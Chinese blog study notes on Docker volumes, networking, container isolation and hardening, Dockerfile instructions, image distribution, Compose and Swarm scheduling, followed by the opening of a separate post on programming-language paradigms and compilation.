避免重复存储：通过层的复用，避免存储冗余重复的相同文件； 简化软件构建过程：通过层的复用，开发者只需关心应用程序本身； 3.3.3 UnionFS 机制的不足存储在设备中的文件需要有一个文件系统进行管理，这个文件系统有很多种实现方式，以面向不同的存储设备，以及取得不同的性能指标；为了兼容这些不同的文件系统，UnionFS 有一套转换的规则；但是，这个规则还不够完美，在某些特定情况下，会出现错误； 第4章 持久化存储和卷间数据共享4.1 存储卷的简介存储卷的本质其实是将某个本地文件夹挂载到容器中，这样容器中对该文件夹所做的写入操作，可以得到持久化的保存； 在 Linux 类的系统中，挂载点是指当前文件系统中的一个目录，这个目录用于连接另外一个文件系统；所谓的文件系统，可将它看做一个目录树，该目录树组织并存放着文件； 一般来说，镜像适合管理一些相对静态的数据，而存储卷适合管理一些相对动态的数据；通过这种分离，可以增灵活性； docker run –volume 选项 如果只写了一个路径 path_a，则表示由 docker 生成某个本地临时目录，并挂载到容器中的 path_a；具体本地目录的路径，可以通过 docker inspect -f Volumes &lt;容器名&gt; 查看到； 如果写了两个路径 path_a : path_b，则表示将主机上的指定路径 path_a 挂载到容器中的路径 path_b； docker run –volume-from 选项 用来授权一个容器 B 访问另外一个容器 A 的 volume，以实现数据共享； 此时，不管原容器 A 是否运行，该授权都会有效；即 B 都可以向 volume 中写入数据；因此，A 容器启动后即可退出，不需保持运行消耗资源；它唯一的目的是作为授权的中介；为了与真正的程序进行区分，一般创建容器时，会使得 echo 命令打出它的用途； 4.2 存储卷的类型存储卷有两种类型 用户指定的本机目录：适用于将容器中发生的数据写入实时共享给主机进程；这种方法会替代容器中同名路径下的内容；如果本机目录不存在，Docker 会自动创建该目录（最好使用手工创建并设置权限，这样更安全一些；Win10 下自动创建失败）； Docker 自动指定的本机目录： 通过增加 ro 参数可以设置存储卷为只读 1docker run -v host-dir:/container-dir:ro &lt;image-name&gt; 除绑定本机目录为容器中的存储卷外，也要以绑定单个文件到容器中，这样可以只替换容器中的单个文件，而不是覆盖整个目录； 绑定本机目录的缺点 这种该种方式制造了容器与本机环境的耦合，降低了可移植性；如果要移植的目录系统没有相应的本机目录，将会导致出错； 当创建多个容器时，这种绑定方式可能会带来冲突； 由 Docker 创建存储目录的优点： 解耦，提高可移植性，避免冲突； 不会暴露存储位置，更加安全一些； 4.3 共享存储卷–volume-from 可以让新创建的容器，继承其他容器的挂载设置，实现数据共享；但这种继承也有一些局限性，包括 只能挂载相同位置，不能更改位置； 多个源容器若挂载相同的点，将出现冲突，只有一个会生效； 无法自定义卷的读写权限，只能继承源容器的权限设置； 4.4 管理卷的生命周期管理卷的生命周期独立于任何容器； 管理卷需要由容器创建，在使用 rm 命令删除容器的时候，通过使用 -v 删除关联的管理卷，此时 Docker 实际是先递减管理卷的引用计数，如果等于零，即没有其他容器引用该管理卷，则会触发该管理卷的删除；如果仍有引用，则只是减少计数，不会删除； 删除容器时，如果忘了使用 -v 选项，则有可能产生孤立卷；这个时候只能手工删除了，操作比较麻烦；因此，使用 -v 选项删除容器是一个好的习惯； 4.5 存储卷的高级容器模式4.5.1 卷容器模式方式：创建一个新容器A，挂载一个管理卷；后续其他容器继承该容器A的卷配置；从而实现卷的共享； 4.5.2 打包数据模式方式：将数据放入镜像，基于该镜像创建容器A，然后将数据复制到挂载的管理卷中，之后其他容器继承该容器A的卷配置，从而获得镜像中的数据； 4.5.3 多态容器模式场景A在镜像的 dockerfile 中定义好容器启动后的默认行为，例如默认执行以下命令： 1node /app/app.js 之后，每次需要执行代码时，只需将主机的代码目录挂载到容器中的 &#x2F;app 项下即可； 基本原理：将不同的文件注入容器中的相同位置，来改变容器的行为变现； 场景B需要对容器中的数据进行分析，但是源镜像中不带有相应的工具应用程序；此时可以通过创建新容器，并挂载一个含有相应工具的目录到容器中，然后通过 docker exec 就可以在容器中调用这些工具了； 场景C配置文件放在某个镜像中，不同环境（开发&#x2F;生产&#x2F;测试）各放一个文件夹，创建不同的卷容器，复制不同文件夹下的配置文件；实际的应用程序关联相应的卷容器即可； 第5章 网络访问5.1 网络相关的背景知识本地回环地址：总共只有一个 IP 地址，从该地址发出的信息，不加处理的立即发送回给该地址，而不会访问其他地址；本地回环主要用来和本地上的其他进程进行通信； 广播地址：它是一个网络地址，用来和网络中的其他主机进行通讯； NAT：net address translation，网络地址转换；当 IP 数据包通过路由器时，对 IP地址进行重写；当有多台主机共用一个公网 IP时，需要使用这个技术；因此它可以用来缓解 IPv4 地址紧张的问题；缺点是会造成一定程度的性能损失； Docker 会创建一个网桥，容器可通过该网桥，连接到主机上面的网络； 5.2 Docker 的网络Docker 创建的网桥很像一个家庭路由器，它接收来自外部的数据，然后再分发给内部相应的容器； Docker 总共有四种网络类型，每个容器都属于其中的一种；它们之间的区别在于隔离程度不同； 5.3 Closed 容器在 Closed 类型的容器中，进程只能和容器中的其他进程通信，不能和容器外的进程通讯，也不能被容器外的其他进程访问；因此它的隔离程度最高； 选项：–net none 1docker run --rm --net none alpine:latest ip addr 5.4 Bridged 容器所有连接到 docker 网桥的接口，都是 docker 内部虚拟网络的一部分；因此这些接口之间可以相互访问，同时，也可以通过网桥和外部进行通讯； 选项：–net bridge（默认选项，因此可不写） 1docker run --rm --net bridge alpine:latest ip addr 5.4.1 自定义域名解析 背景知识：操作系统中正常有一个 hosts 文件，里面记录着域名和 IP 的映射记录；它的作用是用来将域名转换成 IP；在访问一个域名时，操作系统会先在这个文件中查找映射关系；找不到的情况下，才会提高到 DNS 服务器进行查找； nslookup 命令可用来查询域名和IP地址的映射关系 docker 提供了多个选项用来将主机名自定义的映射到某个指定的 IP 地址，这样可以实现与具体 IP 地址的解耦；这些选项包括： –hostname –dns –add-host –dns-search 其基本原理都是将修改添加到容器中的 &#x2F;ect&#x2F;hosts 文件中；因此，通过查看这个文件，就可以知道当前容器做了哪些配置；理论上也可以通过修改这个文件来达到相同的效果； 5.4.2 开放对容器的访问–publish 选项可实现主机端口到容器端口的映射；它有四种格式，分别实现不同粒度级别的控制； -p 3333，将容器端口 3333 绑定到主机的一个动态端口上； -p 3333:3333，将容器端口 3333 绑定到主机的 3333 端口上； -p 192.168.0.32:3333:3333，将容器端口3333绑定到 IP 地址为 192.168.0.32 的主机的 3333 端口上； -p 192.168.0.32::3333，将容器端口 3333 绑定到IP地址为 192.168.0.32 的主机的动态端口上； –expose 选项可增加容器所要暴露的端口 1docker run --expose 8000 -P &lt;image_name&gt; 5.4.3 跨容器通信默认情况下，所有的本地容器都连接到 Docker 网桥，因此，所有本地容器都是可以相互通信的；通过 –icc&#x3D;false 选项，可以关闭默认开启的跨容器通信；此时想要正常的工作，必须显式的声明依赖；这种方式可以提高容器的安全性； 5.4.4 修改网桥的配置 –bip，设置网桥的 IP 地址，以及它的子网的 IP 范围 –mtu，设置最大传输单元，用来限制数据包的最大值； –bridge，使用自定义的网桥配置； 5.5 Join 容器–net container:&lt;容器名&gt; 选项，可用来将 B 容器与 A 容器进行连接；连接后，两个容器各自的资源独立，但共享一个网络组件，这意味着它们的端口全部共用（需要注意避免冲突问题）；这种场景非常特殊，因为即使它们不连接，原本也可以通过 docker 网桥相互通信； Join 容器的使用场景 分别处于两个容器内的程序，想通过本地回环接口来相互通信； A 容器中的程序改变网络栈，而 B 容器的程序依赖于被改变后的网络栈； A 容器中的程序，想要监控 B 容器中的程序的网络流量； 5.6 Open 容器–net host 选项用来创建 open 容器； open 容器完全没有隔离机制，它直接绑定主机的网络接口，因此，它也可以绑定到 1024 以下编号的端口，也能够访问到所有的主机端口； 5.7 跨容器依赖5.7.1 链接使用链接，可以让 B 容器访问某个服务时，被链接到 A 容器，实现二者的相互通信； 12docker run -d --name DATA --expose 3306 dockerinaction/mysql \\service mysql start 12docker run -d --name APP --link DATA:db dockerinaction/webapp \\startapp.sh -db tcp://db:3306 为新创建容器添加链接会有如下的效果： 创建关于被链接的目标容器的环境变量； 添加链接的别名和目标容器的 IP 地址到 DNS 文件中； 添加防火墙规则以实现二者的通信（如需） 5.7.2 链接别名别名不可避免会带来冲突或者失败的可能，因为各个容器的创建者有可能未就别名形成共同的约定； 解决的办法之一：在容器启动时，内置一段自动运行的脚本，来检测相关的依赖条件是否都已经成立 12!/bin/shif [ -z $&#123;DATABASE_PORT+x&#125; ] then echo &quot;Link alias &#x27;database&#x27; was not set!&quot; exit else exec &quot;$@&quot; fi 原理：当使用 –link 链接选项时，docker 会在新建的容器中，创建相应的以链接的目标容器别名为前缀的一系列环境变量，例如 –link mydb:database 的别名为 database，则容器中的环境变量的前缀为 DATABASE； 5.7.3 环境变量的改动链接所创建的一系列环境变量如下： 别名_PORT_端口号_协议名_PORT 别名_PORT_端口号_协议名_ADDR 别名_PORT_端口号_协议名_PROTO 别名_PORT_端口号_协议名 别名_PORT &#x2F;本容器名&#x2F;被链接的容器名 5.7.4 链接的本质和缺点缺点：链接的原理是通过创建目标容器时，进行查询并保存源容器的信息来实现的；因此，当源容器重启后，目标容器保存的仍然是源容器的旧信息，这时将导致调用源容器的服务失败； 解决方法：使用 DNS 动态解析； 第6章 隔离–限制危险6.1 资源分配6.1.1 内存限制–memory &lt;数字&gt;&lt;单位&gt; 选项实现内存使用限制； 1docker run -d --name mylab --memory 256m --cpu-shares 1024 &lt;镜像名&gt; 需要考虑两个问题 程序的正常运行最少需要分配多少内存？ 系统有多少可分配的内存？ 6.1.2 CPUCPU 是进程轮流使用的，因此当它太忙时，程序并不会失败，而是会等很久，即性能缓慢； 限制 CPU 使用的两种方式 配置分配 CPU 周期的权重；权重分配仅在 CPU 资源紧张时，才会触发执行； 限制容器可用的 CPU 核数； 6.1.3 设备的访问权使用 –device 选项，可将主机上的设备映射到容器中，这样容器内的程序就可以访问主机上面的设备了； 6.2 共享内存使用 –ipc container:&lt;待共享的容器名&gt; ，可实现两个容器共享一个 IPC 命名空间，从而实现共享内存 –ipc host 选项可用来实现和主机共享内存，这会带来一定的危险，一般情况下应该避免使用；除非需要通信的进程只能运行在主机上； 6.3 用户角色一般来说，容器中的用户使用 root 角色，由于 root 角色拥有最高级别的权限，因此该角色可以对容器中的文件进行一切修改；虽然这种修改只限于容器内，但是如果容器链接着存储卷，则修改会涉及到存储卷；最安全的办法是避免使用 root 用户，但在某些情况下又做不到，例如构建镜像必须使用 root 权限； 6.3.1 Linux 用户命名空间用户命名空间是 Linux 推出的一个新功能，它可以将容器中某个 ID 的用户映射到主机上的另外一个 ID 用户； 特别注意：容器的用户和主机上的用户共享一个 ID 命名空间，这意味着，容器中 root 用户如果有机会更改或访问主机上的文件，它也是以 root 身份来运行的，这非常危险； 6.3.2 run-as 用户–user 选项可以用来设置 run-as 用户 1docker run --rm --user nobody busybox:latest 12# 用户名+用户组docker run --rm --user nobody:default busybox:latest 12# 用户ID+用户组IDdocker run --rm --user 10000:20000 busybox:latest 6.3.3 用户和卷除非想让主机上面的文件被容器访问，否则一般不将文件以卷的形式挂载到容器中；因为容器和主机共享一个用户 ID 空间，因此存在一定的安全隐患； 通过设置文件所属的用户和用户组，并配合使用 –user 选项来启动容器，就可以解决不同容器对指定文件的写入和读取权限问题； 6.4 功能授权–cap-drop 选项可以用来减少容器中进程的系统调用权限，以增加安全性；–cap-add 则相反，可以用来添加系统调用权限； 6.5 运行特权容器当需要在容器中运行系统管理任务时，需要授予容器访问主机的系统权限，此时该容器会变成一个特权容器； –priviledged 选项可用来开启特权容器； 6.6 使用加强工具6.6.1 指定额外的安全选项Linux 使用 LSM 框架作为操作系统与安全软件之间的接口层；Docker 也支持在创建容器时，加载自定义的 LSM 配置来提高安全性； –security-opt 选项可用来设置一些安全规则； 更高级别的 Linux 安全机制一般通过引入 SELinux 或 AppArmor 模块来实现，它们可以弥补 Linux 内核本身默认配置下安全性的一些不足；Docker 支持设置选项来启用这些模块的功能； 6.6.2 微调 LXCLXC 是一个库，用来方便的使用 Linux 命名空间，它即是当时开发 Docker 的缘起；后来出现了可移植性更高的 libcontainer 库；它们两个都是容器运行的底层引擎；Docker 支持通过 –exec-driver 对底层引擎进行自定义的更换和配置； 例如如果更换底层引擎为 LXC，则 run 或 create 容器时，就可以通过 –lxc-conf 来自定义一些配置；自定义越多，可能意味着可移植性越低，需要做好平衡； 6.7 因地制宜的容器构建6.7.1 应用 确定运行应用的用户只拥有有限的权限； 限制浏览器的系统调用权限； 限制应用的 CPU 和内存资源； 指定应用能够访问的设备白名单； 6.7.2 高层的系统服务系统服务不是操作系统的一部分，而是运行某些应用所需的底层支持；很少有系统服务需要全部的系统调用权限，因此，对它们进行限制有利于提高安全性； 6.7.3 底层的系统服务底层的系统更接近于操作系统的一部分，但幸运的是，它们很少做为容器来运行，因此可以避免其可能带来的风险； 第2部分 镜像发布：如何打包软件第7章 在镜像中打包软件7.1 从容器中构建镜像大致流程： 创建一个容器； 在容器中添加文件； 使用 commit 命令以该容器为模板创建新的镜像； 可以使用 docker diff container-name 来查看某个容器内发生的文件改动 A 表示新添加的文件 C 表示修改的文件 D 表示删除的文件 docker commit 最好添加 -a 和 -m 选项，分别用来标示作者和备注信息； 1docker commit -a &quot;@ccw&quot; -m &quot;Added something&quot; my_container_name new_image_name 在创建一个容器时，如果使用了 entrypoint 选项，它的参数将在容器创建后被执行；如果没有指定 entrypoint 选项，则原本的默认命令会被执行；当有了 entrypoint 后，如果基于当前容器新建镜像，则新镜像会默认继承这个 entrypoint 选项，成为基于新镜像创建的容器的默认命令； 其实不仅是 entrypoint 会被记录下来，旧容器中的以下内容也会被记录进行新镜像，包括：（如果没有指定，则继承原镜像） 所有的环境变量 工作目录 暴露的端口集合 所有的卷定义 命令和参数 容器入口点 7.2 深入 docker 镜像和层联合文件系统的层非常类似 git 中的每次 commit，它只是对新的修改进行标记，而并不是真的去删除旧的文件；而在读取的时候，通过从最上层开始读取，就可以保证读取的是最新的文件； 这种方法的缺点是随着改动次数的增加，镜像将不可避免的变得越来越大，即使改动是删除里面的文件也是如此；因为文件并没有被真正的删除，而只是增加了一层，然后标记了删除而已； 为了解决镜像变得臃肿的问题，更好的解决办法是使用分支，这跟 git 的版本管理是一样的；但是，两个分支有可能在后续的某个地方存在很多相同的操作，这样不可避免会有很多重复的工作；为了解决这个问题，办法是使用 dockerfile 来记录对镜像的改动，从而是使得镜像的构建工作变得自动化，同时也减少出错的可能性，办法是使用导出和导入扁平文件系统； 7.3 导出和导入扁平文件系统导出方法 基于镜像创建容器，记得带上 For Export 命令； 使用 docker export 进行导出； 123docker run --name export-test myimage:latest ./echo For Exportdocker export --output contents.tar export-testdocker rm export-test 导入方法 将文件打包成一个压缩文件 使用 docker import 将其导入并生成一个新镜像 123tar -cf static_hello.tar hello.odocker import - myimage &lt; static_hello.tar# import 后面的中横杠表示从标准输入读取导入，此处也可以替换为 URL 来表示从远程导入 小结：通过导入的方法新创建的镜像的优点是它会非常小，因为它会将所有无用的文件都剔除掉，使得文件层被打扁到只剩下一层；缺点也在于此，它将使得层的复用变得无效 7.4 版本控制的最佳实践使用注释+版本号结合的方式进行版本说明，这样可以减少很多不必要的误会； 第8章 自动化构建和高级镜像设置刚刚才发现之前对 dockerfile 存在误解，以为对 dockerfile 进行修改之后的重新构建都是从零开始；但其实不是的，它会复用之前缓存的所有层； 使用 –no-cache 选项可以禁止缓存使用，但这通常不是明智的选择，除非可以确保构建过程中不会发生任何问题； 8.1 使用 Dockerfile 打包 GitDockerfile 总共有14个指令，目前用到的包括：FROM, RUN, MAINTAINER, ENTRYPOINT 等； 8.2 Dockerfile 入门构建指令的在线文档：https://docs.docker.com/reference/builder/ 8.2.1 元数据指令ENV 可以用来设置镜像的环境变量，并且在 dockerfile 中，这些环境变量能够被引用； LABEL 可用来设置镜像元数据的键值对； WORKDIR 可用来设置工作目录；若该指定的工作目录不存在，则会被自动创建； EXPOSE 可用来设置对外暴露的端口； ENTRYPOINT 可用来设置在容器启动时，需要被运行的可执行程序；它有两种格式： shell 格式：类似普通的 shell 命令，以空格分隔参数； exec 格式：使用字符串数组来放置命令参数； ENTRYPOINT 如果指向不存在的文件，会导致容器启动失败，但是它可以起到复用的作用，避免让后续基于该镜像创建的子镜像之间重复构建相同层； 如果使用 shell 格式，会导致 CMD 指令的其他参数，或者 docker run 命令的参数被忽略，因此 shell 格式的灵活性有所限制； USER 指令可用来设置默认的用户组和用户名； 8.2.2 文件系统指令COPY 可用来复制主机上的文件到镜像中，它的副作用是会将文件的所有者更改为 root，因此，在复制完以后，如有需要，可使用 RUN 指令更改文件的所有者； COPY 指令同样也支持 shell 和 exec 两种网格，一般建议使用 exec 风格，因为 shell 风格不支持参数字符串中带有空格； VOLUME 用来设置存储卷，作用同 docker run 指令中的 –volume 参数；不过此处的 volume 只能创建管理存储卷，而不能创建挂载存储卷； CMD 作用有点类似 ENTRYPOINT，不同点在于： 若已经设置 ENTRYPOINT 时，CMD 将为 ENTRYPOINGT 提供参数； 若没有设置 ENTRYPOINT 时，CMD 默认调用命令 &#x2F;bin&#x2F;bash，将为其提供参数； 12ENTRYPOINT [&quot;app/mailer.sh&quot;] # 指定了一个入口点的待运行程序CMD [&quot;/var/log/mailer.log&quot;] # 为入口点的程序提供了一个参数，指明日志文件路径 ADD 作用类似 COPY，不同点在于： 如果指定一个 URL，它会拉取远程文件； 如果指定一个压缩包，它会自动提取其中的源文件； 8.3 注入下游镜像在构建时发生的操作ONBUILD 是一个非常特别的指令，它的内容不会在构建当前镜像时被执行，而只会在被引用构建其他镜像时，才会被执行； 12345FROM busybox:latestWORKDIR /appRUN touch /app/base-evidence# 以下的 onbuild 指令被构建子镜像时处理ONBUILD RUN ls -al /app 123FROM dockerinaction/ch8_onbuildRUN touch downstream-evidenceRUN ls -al . （为什么要这么做呢？） 8.4 使用启动脚本和多进程容器8.4.1 验证环境是否满足条件在容器启动时，使用启动脚本检查一下相关环境条件是否已经满足，若不满足，尽早及时报错；一般需要验证的内容包括： 需要使用的链接或别名 环境变量 网络访问可用性 网络端口可用性 根文件系统的挂载参数 存储卷 当前用户名或组 一般来说，启动脚本可以使用任意语言来写；但如果是为了让镜像最小化，则一般使用 shell 语言来写，因为 shell 是自带的； 8.4.2 初始化进程Unit 系统在启动时一般会启动一个 init 初始化进程，由它来启动所有的系统服务；因此，也可以依托于 init 进程，来进行容器的初始化设置； 有很多现成的 init 工具，每种都有相应的优缺点和适用场景，需要根据实际情况进行选择；一般需要考虑的因素包括： 可能产生的额外依赖； 文件大小； init 进程如何传递信号量到子进程； 需要的用户权限； 是否支持监控和重启； 如何清理僵尸进程； 常用工具包括：runit, supervisord, busybox init, daemon 等； 8.5 加固应用镜像加固镜像的常用方法： 最小化镜像的大小：包含的组件越少，漏洞可能越小； 强制基于某个特定镜像来构建； 强制容器使用合适的默认用户； 去除提权为 root 用户的可能； 8.5.1 内容可寻址镜像标识符构建指令 FROM 的参数如果是镜像名+标签，这种方式有一个缺点，即如果原始镜像被改动过了，单纯从镜像名和标签上面有可能是看不出来的（当标签没有更新的时候）；解决这个问题的办法是将镜像名更改为镜像 ID，这样就可以确保基础镜像的唯一性； 8.5.2 用户权限镜像作者唯一能够做的是给镜像创建用户和用户组，以提高安全性；尽管如此，容器创建者是有绝对权限覆盖镜像作者的配置的； 有些应用在启动时，是需要 root 权限的，例如 postgres；如果容器的 USER 已经设置为非管理员，则可以使用 su 或 sudo 来启动应用进程； 如果构建的镜像是用来运行某个特定的应用程序，则一般应尽量削减容器中应用的权限； 8.5.3 SUID 和 SGID 权限如果一个文件设置了 SUID 和 SGID 权限，则它可以让原来没有访问权限的进程，有权限访问该文件；解决的办法有两个： 删除该文件； 取消该文件的 SUID 和 SGID 权限设置； 123RUN for i in $(find / -type f (-perm +6000 -o -perm +2000)); do chmod ug-s $i; done 第9章 公有软件和私有软件分发9.1 选择一个分发方法没有标准唯一的分发方法，只能根据项目的不同需求，选择最合适的一种方法；每种方法都有相应的优缺点； 有很多的选择维度，需要根据实际情况进行权衡； 9.2 通过托管 registry 发布9..2.1 使用公有仓库的发布步骤 docker login 登录仓库 docker push 推送镜像 9.2.2 使用自动构建进行发布其基本原理是使用 git 作为镜像构建指令的版本管理工具，然后使用 webhook 调用 docker hub 的接口，之后 docker 下载最新的构建指令版本，进行自动化构建，完成后推送到 docker hub 上面； 9.2.3 私有托管仓库使用私有仓库的方式跟公有仓库完全一样，唯一的区别是下载镜像前需要登录；私有仓库虽然对公众不可见，但对提供 registry 服务的公司是可见的，因此可能不适合用于高度机密的场景； 9.3 通过私有 registry 发布创建私有 registry 也很简单，只需从 docker hub 上下载镜像、启动容器、暴露接口，这样就可以进行访问了； 9.4 镜像的手动分发所谓的手动分发，其实就是将镜像当作一个文件来处理；通过使用 docker 的导入导出功能，进行文件的分发； 9.5 分发镜像代码这种方法就与 docker registry 分发机制无关了，只需使用常见的版本控制工具（如 git），就可以完成分发工作了；使用者下载最新版本的 dockerfile，然后在本地自动构建镜像； 第10章 运行自定义 Registry第3部分 多容器和多主机环境第11章 Docker Compose 部署11.1 Docker Composedocker-compose 使用 yaml 格式的文件来声明多个容器的创建过程及相互的依赖关系； yml 文件可以配合 dockerfile 一起使用；前者用来定义依赖关系，后者用来定义镜像的构建细节； 123456789101112# Filename: docker-compose.ymlwordpress: image: wordpress:4.2.2 links: - &quot;db:mysql&quot; ports: - &quot;8080:80&quot; db: image: mariadb environment: MYSQL_ROOT_PASSWORD: example 123456# 启动当前目录下由 docker-compose.yml 文件定义的容器docker-compose up # 查看所有容器的日志docker-compose logs# 删除当前目录下由 docker-compose.yml 文件创建的容器docker-compose rm -v 若当前目录下的 docker-compose.yml 文件定义的容器已经创建，再次运行 docker-compose up，它会删除原来的镜像，并重新创建； 如果只需重新构建其中一个或多个容器，则可以使用 docker-compose build 命令； 感觉 docker-compose 下的命令跟原来的 docker 貌似大致差不多 docker-compose rm -vf 不能强制停止容器，需要先 stop； CentOS 安装 Docker-compose1234# 版本号 1.25.4 需要根据实际情况更新sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose 11.2 环境内的迭代11.2.1 构建、启动、重启服务1234567891011# 构建镜像（但不拉取）docker-compose build# 拉取镜像（但不构建）docker-compose pull# 启动docker-compose up -d [某个镜像或全部]# 不重启所有依赖的容器docker-compose up --no-dep -d &lt;某个镜像&gt;# 当某个容器中的应用程序代码有修改时，只需重新构建该镜像，并再次 docker-compose up 即可；docker-compose build &lt;镜像名&gt;docker-compose up -d 11.2.2 服务伸缩和删除123# 创建多个应用程序的容器，以提高并发能力docker-compose scale &lt;镜像名&gt;=&lt;扩展数量&gt;# 扩展数量为 1，则会删除多余的容器（如有） 如果容器内的端口被映射到主机的 0 号端口上，则表示自动选择一个主机上可用的端口进行映射；相对手工指定一个固定的主机端口，这种做法的好处是，当批量创建多个容器以提高并发时，不会出现冲突； 12# 删除整个服务docker-compose down 11.2.3 迭代和持久化发现一个问题，即 docker-compose 项下的命令，都是要读取当前目录中的 yaml 配置文件后，才进行操作的；因此，如果在配置文件下变更某个镜像名称，有可能导致基于该镜像创建的容器，变成一个孤立的容器，不再受到 docker-compose 管理； 此时只能使用 docker 命令进行手工管理了；或者除非重新将它添加到 yaml 文件中才行； 11.2.4 网络和连接当单独重启整个 compose 的单个服务时，由于重启后 IP 地址发生变化，因此可能导致其它依赖该容器的服务变成不可用；有两种解决办法： 重启整个 compose 中的所有容器； 使用动态解析； 11.3 深入 Compose YAML 文件11.3.1 启动前的构建、环境变量、元数据、网络设置build 用来指定 Dockerfile 文件所在的目录；dockerfile 可用来指定 Dockerfile 文件的具体名称；environment 用来设置环境变量；labels 用来设置容器的元数据信息；expose 声明容器暴露的接口，该值可为列表；ports 声明与主机的端口映射；该值可为列表；link 用来声明对其他容器的依赖；该值可为列表；depends_on 用来指定依赖的其他镜像； 11.3.2 源镜像引用、数据卷image 用来指定要引用的源镜像，最好使用 ID 引用，而非名称引用；volumes 用来设置存储卷；volumes_from 用来设置存储卷引用；restart 用来设置重启选项；command 用来指定要运行的命令； 11.3.3 YAML 配置复用compose.yaml 支持多个配置文件的叠加，这样可以实现根据不同的环境（如测试、生产等），使用不同的构建方案，并实现基础配置的复用； 比如可以做一个基础的配置文件(如 docker-compose.yml)，然后就不同的配置选项，各自做一份配置文件，如 docker-compose.test.yml 和 docker-compose.prod.yml；这样 docker-compose.yml 可以实现复用； 在运行 docker-compose up 进行启动时，通过 -f 选项，指定要使用的相应配置文件即可； 第12章 Docker Machine 和 Swarm 集群前面的11章的所有实现，都是在单台机器上面；但如果需要将服务部署在不同机器上面时，就需要引入新的工具了；目前主流的多主机容器编排工具有：Swarm, Mesos, Kubernates 等，三者都有各自的优缺点和擅长的使用场景； 12.1 Docker Machine 简介docker machine 用来在多个主机上安装和管理 docker engine； 12345docker-machine create --driver virtualbox host1docker-machine start host1docker-machine stop host1docker-machine kill host1docker-machine rm host1 只有每台主机都安装了 docker 引擎后，后续使用 swarm 进行集群的管理才具备可行性；当有多台机器时，每次对其中一台机器进行操作，都需要有一个切换的动作，即将当前默认连接的机器，切换成要进行操作的机器；当有很多机器时，这种操作方式的工作量很大，貌似非常不人性； 12.2 Swarm 简介swarm 管理的对象是集群，集群由若干数量的主机组成，里面的机器有两种类型，一种是管理节点 manager，一种是工作节点 node； 集群对外提供服务，当这个服务被外部访问时，如果请求到达的节点，实际并没有运行提供该服务的容器，则该请求会被路由到提供该服务的节点上； swarm 创建集群的步骤1. 创建集群的标识符1234567# 创建一个新的本地 docker enginedocker-machine --driver virtualbox local# 切换到新建的 docker engineeval &quot;$(docker-machine env local)&quot;# 使用 swarm 镜像创建容器，调用 create 命令创建标识符(token)docker run --rm swarm create# 此处假设得到的 token 值为 &quot;abcdef1234567890&quot; 2. 创建集群节点123456# 创建管理节点 machine0docker-machine create --driver virtualbox --swarm --swarm-discovery --swarm-master token://abcdef1234567890 machine0-manager# 创建工作节点 machine1docker-machine create --driver virtualbox --swarm --swarm-discovery token://abcdef1234567890 machine1# 创建工作节点 machine2docker-machine create --driver virtualbox --swarm --swarm-discovery token://abcdef1234567890 machine2 当节点运行在 swarm 集群模式下时，运行有些 docker 命令将显示不一样的效果，命令将作用于整个集群，而不是单个节点 12345# 显示集群信息docker info# 拉取镜像到每一个节点上docker pull &lt;镜像名&gt;# docker rm &lt;容器名&gt; 将会自动在某个节点上删除容器； 12.3 Swarm 调度Swarm 提供了三种不同的调度算法，适用于不同的业务场景； 通过 –swarm-strategy 选项用来指定算法 12.3.1 Spread 算法该算法按照每个节点当前运行的容器数量进行排名，数量少的优先安排；数量相等的则随机选一个； 但这种算法有一个缺点，即每个容器所缺的资源是不一样的，单纯的按容器数量来排名，并不一定代表资源被合理利用； 12.3.2 用过滤器调整 spread 的调度过滤器的原理是通过设置一些约束条件，来减少随机分配的范围，避免随机分配可能带来的资源配置不均匀； 可以用来做为过滤条件的信息有 手动的标签 环境变量 容器元数据； 12.3.3 BinPack 算法Spread 算法是基于已有的节点进行容器分配的，其目标是平均荷载最小化，这意味着当节点过多时，会存在很多资源浪费； BinPack 算法的目标是确保资源利用最大化，即仅在已有节点不能创建更多容器时，才会将容器安排在新节点上面； 每个容器需要多少资源，正常情况下是不知道的，因此，为了能够让 BinPack 发挥作用，好的作法是给每种容器标注资源使用限制； BinPack 的策略可以让其实现集群自动伸缩，但是它付出的代价是特征一定的可靠性； 12.3.4 随机调度算法随机算法的策略是啥也不管，无为而治，所以暂时还不知道哪种业务场景特别使用这个算法；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"程序设计语言","slug":"程序设计语言","date":"2019-12-24T00:06:00.000Z","updated":"2024-09-22T23:08:43.596Z","comments":true,"path":"2019/12/24/程序设计语言/","permalink":"http://example.com/2019/12/24/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80/","excerpt":"","text":"第1部分：基础第1章：引言语言设计的艺术概念的清晰性和实现的效率都是最基本的诉求；因此程序设计更像是一种艺术，因为它经常需要在二者之间做出折中； 程度设计语言的谱系计算机的本质是在做计算，不同的语言，将计算视为不同的概念； 函数式：将计算视为输入和输出的函数； 面向对象：将计算视为不同独立对象之间的相互作用； 逻辑式：将计算视为找出满足某些特定关系的值的尝试过程； 冯诺依曼式：将修改变量的值做为计算的一种基本方式； 脚本式：粘合多个独立开发的程序部件，实现某些特定的目的；强调表达的方便，以便用于快速的建立原型，但一般会牺牲一些执行的速度； 程序语言本身的表达逻辑，会不自觉的影响程序员的思考方式； 编译和解释编译和解释的区别 编译器本身也是由某种高级语言写的源程序编译而成的目标程序；编译器不控制输入的执行过程；在翻译成目标程序后，编译器就不再管了； 解释器通过迟约束（late binding），将有关程序实现的决策推迟到运行时再进行，从而带来了更大的灵活性，它完全控制了执行的过程，因此能对源程序做出更好的诊断和调试；缺点是牺牲了性能，尤其是当程序被多次运行的时候更加明显； 编译和解释的根本区别在于是否介入执行的过程；有很多语言的实现采用了编译和解释二者混合的形式； 编译与预处理的区别 是否进行彻底的分析和非简单的变换，即为编译器区别于预处理器的标志性特征； 编译在广义上可以指代很多事情，只要这些事情涉及将输入的语言进行彻底的分析，并进行非简单的变换，使之成为另外一种语言； 程序设计环境设计一个程序的过程中，不仅需要编译器和解释器，还需要其他一系列工具相互配合，包括编辑器、预处理器、汇编器、链接器、调试器、性能分析器等； 集成开发环境 IDE 通过整合上述工具进行协同工作，提高了程序设计的效率； 编译概览前端 阶段 输入 输出 词法分析 字符流 单词流 语法分析 单词流 语法分析树 语义分析 语法分析树 抽象语法树 后端 阶段 输入 输出 代码改进 抽象语法树 中间代码 目标代码生成 中间代码 目标代码 